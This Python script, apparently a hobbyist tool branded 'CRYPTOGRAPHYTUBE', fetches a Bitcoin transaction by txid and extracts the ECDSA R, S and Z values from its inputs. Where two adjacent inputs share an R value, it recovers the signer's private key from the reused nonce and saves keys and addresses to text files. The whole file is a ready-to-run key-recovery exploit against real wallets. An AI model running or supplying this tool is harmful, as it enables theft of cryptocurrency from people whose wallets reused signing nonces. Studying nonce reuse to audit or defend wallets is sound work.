import sys
import binascii
from bitcoin import *
import argparse
from urllib.request import urlopen
import hashlib
import base58
from sympy import mod_inverse

# Parsing user input
parser = argparse.ArgumentParser(description="[+] Get RSZ Value from Bitcoin Transaction", epilog="[+] CRYPTOGRAPHYTUBE \n")
parser.add_argument("-txid", help="Enter txid of a Bitcoin transaction", action="store")  
parser.add_argument("-raw", help="Enter rawtx if you have it", action="store")
if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)
args = parser.parse_args()

txid = args.txid if args.txid else ''
rawtx = args.raw if args.raw else ''

if txid == '' and rawtx == '':
    print("One of the options (txid/rawtx) is missing. Please provide correct input."); sys.exit(1)

# CRYPTOGRAPHYTUBE
def getRaw(txid):  
    try:
        filehtml = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout=20)  # Changed 'txhash' to 'txid'
    except:
        print("Cannot connect to the Internet. Please connect to data/WiFi.\nOr the tx id is incorrect.")
        sys.exit(1)
    else:
        res = filehtml.read().decode('utf-8')
    return res

# CRYPTOGRAPHYTUBE
def toBin(HEX):
    return binascii.unhexlify(HEX)

# CRYPTOGRAPHYTUBE
def tohash160(pub_bin):
    sha256_hash = hashlib.sha256(pub_bin).digest()
    ripemd160 = hashlib.new('ripemd160')
    ripemd160.update(sha256_hash)
    return ripemd160.hexdigest()

# CRYPTOGRAPHYTUBE
def dblsha256(binHex):
    return hashlib.sha256(hashlib.sha256(binHex).digest()).hexdigest()

# CRYPTOGRAPHYTUBE
def getRS(sig):
    rl = int(sig[2:4], 16)
    r = sig[4:4 + rl * 2]
    s = sig[8 + rl * 2:]
    return r, s

# CRYPTOGRAPHYTUBE
def rspub(scr):
    sigL = int(scr[2:4], 16)
    # CRYPTOGRAPHYTUBE
    sigs = scr[2 + 2:2 + sigL * 2]
    r, s = getRS(sigs[4:])
    pubL = int(scr[4 + sigL * 2:4 + sigL * 2 + 2], 16)
    pub = scr[4 + sigL * 2 + 2:]
    assert (len(pub) == pubL * 2)
    return r, s, pub

# CRYPTOGRAPHYTUBE
def parsingRaw(txRaw):
    if len(txRaw) < 130:
        print("[Cryptographytube ], The rawTx seems incorrect. Please check again.")
        sys.exit(1)

    inputLst = []
    version = txRaw[:8]
    if txRaw[8:12] == '0001':
        print("Tx input is not valid. Witness data found.")
        sys.exit(1)

    inputNo = int(txRaw[8:10], 16)
    no1 = txRaw[0:10]
    cur = 10
    for g in range(inputNo):
        pre_out = txRaw[cur:cur + 64]
        var0 = txRaw[cur + 64:cur + 64 + 8]
        cur = cur + 64 + 8
        scrL = int(txRaw[cur:cur + 2], 16)
        scr = txRaw[cur:2 + cur + 2 * scrL]
        r, s, pub = rspub(scr)
        seq = txRaw[2 + cur + 2 * scrL:10 + cur + 2 * scrL]
        inputLst.append([pre_out, var0, r, s, pub, seq])
        cur = 10 + cur + 2 * scrL
    hsl = txRaw[cur:]
    return [no1, inputLst, hsl]

# CRYPTOGRAPHYTUBE
def getrsz(pars):
    result = []
    no1, inputLst, hsl = pars
    tot = len(inputLst)
    for x in range(tot):
        e = no1
        for i in range(tot):
            e += inputLst[i][0]
            e += inputLst[i][1]
            if x == i:
                e += '1976a914' + tohash160(toBin(inputLst[x][4])) + '88ac'
            else:
                e += '00'
            e += inputLst[i][5]
        e += hsl + "01000000"
        z = dblsha256(toBin(e))
        addr = pubtoaddr(inputLst[x][4])
        result.append([inputLst[x][2], inputLst[x][3], z, inputLst[x][4], e, addr])
    return result

# CRYPTOGRAPHYTUBE
def pubtoaddr(pub_hex):
    pub_bin = binascii.unhexlify(pub_hex)
    sha256_hash = hashlib.sha256(pub_bin).digest()
    ripemd160 = hashlib.new('ripemd160')
    ripemd160.update(sha256_hash)
    hashed_pub = ripemd160.digest()
    checksum = hashlib.sha256(hashlib.sha256(b'\x00' + hashed_pub).digest()).digest()[:4]
    address = b'\x00' + hashed_pub + checksum
    return base58.b58encode(address).decode()

# CRYPTOGRAPHYTUBE
def recover_private_key(R, S1, S2, Z1, Z2):
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 order
    k = ((Z1 - Z2) * mod_inverse(S1 - S2, n)) % n
    d = (((S1 * k) - Z1) * mod_inverse(R, n)) % n
    return hex(d)

# CRYPTOGRAPHYTUBE
def check_and_save_matching_r(e, address_file="matching_addresses.txt"):
    with open(address_file, "a") as f:
        for i in range(1, len(e)):
            if e[i][0] == e[i-1][0]:  # Check if R values are the same
                print(f"\n[+] Found reused R values at input {i} and {i-1}")
                f.write(f"Transaction with matching R value:\n{e[i][4]}\nAddress: {e[i][5]}\n")
                print(f"[+] Address and transaction saved to {address_file}")

# CRYPTOGRAPHYTUBE
if rawtx == '':
    rawtx = getRaw(txid)  # Changed 'txhash' to 'txid'

print("[+] Starting the program ... ")
m = parsingRaw(rawtx)
e = getrsz(m)

private_key_found = False
for i in range(len(e)):
    print('=' * 50, f'\n[+] Input No: {i}\n  R: {e[i][0]}\n  S: {e[i][1]}\n  Z: {e[i][2]}\nPubKey: {e[i][3]}\nAddress: {e[i][5]}')

    if i > 0 and e[i][0] == e[i-1][0]:  # Check if R values are the same
        print("\n[+] R values are the same! Attempting to recover private key...")
        private_key = recover_private_key(
            int(e[i][0], 16),  # R
            int(e[i-1][1], 16),  # S1
            int(e[i][1], 16),  # S2
            int(e[i-1][2], 16),  # Z1
            int(e[i][2], 16)   # Z2
        )
        print(f"[+] Private Key: {private_key}")
        
        # Saving private key and address to a text file
        with open("found_private_keys.txt", "a") as f:
            f.write(f"Private Key: {private_key}\nAddress: {e[i][5]}\n\n")
        
        private_key_found = True

# CRYPTOGRAPHYTUBE
check_and_save_matching_r(e)

if not private_key_found:
    print("\n[+] No reused R values detected. Private key cannot be recovered.")

print("[+] Program Completed")
print("\nCreated by: CRYPTOGRAPHYTUBE")  